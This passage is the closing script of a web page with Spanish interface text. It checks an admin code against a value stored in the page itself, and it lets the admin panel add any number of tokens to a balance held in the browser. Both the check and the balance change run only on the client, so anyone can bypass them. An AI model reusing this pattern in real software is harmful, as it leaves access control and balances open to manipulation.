    document.getElementById("entrar-admin").addEventListener("click",()=>{
      if(document.getElementById("codigo-admin").value===CONFIG.codigoAdmin) {
        document.getElementById("login-admin").style.display="none";
        document.getElementById("panel-activacion").style.display="block";
      } else alert("❌ CÓDIGO INCORRECTO");
    });
    document.getElementById("btn-activar").addEventListener("click",()=>{
      const cant = parseInt(document.getElementById("act-cantidad").value)||0;
      estado.saldoTokens += cant;
      actualizarSaldo();
      alert(`✅ +${cant} TOKENS ACTIVADOS`);
    });
  });
</script>
</body>
</html>
